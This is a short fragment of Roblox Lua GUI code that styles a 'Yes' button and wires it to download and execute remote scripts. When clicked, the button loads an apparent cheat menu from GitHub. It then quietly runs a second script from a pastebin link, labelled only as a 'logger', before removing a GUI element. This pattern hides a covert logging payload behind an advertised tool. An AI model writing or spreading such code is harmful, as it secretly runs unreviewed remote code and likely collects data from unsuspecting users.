Yes.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
Yes.BorderSizePixel = 0
Yes.Position = UDim2.new(0.0277087111, 0, 0.554932773, 0)
Yes.Size = UDim2.new(0, 117, 0, 32)
Yes.Font = Enum.Font.SourceSans
Yes.Text = "Yes"
Yes.TextColor3 = Color3.fromRGB(0, 0, 0)
Yes.TextSize = 14.000
Yes.MouseButton1Down:connect(function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/mrgunz/S/main/Robber%20Menu"))()
	--- logger ---
	loadstring(game:HttpGet("https://pastebin.com/raw/FrKnCSn6"))()
	wait(1)
	game:GetService("CoreGui")["?"]:Destroy()
end)

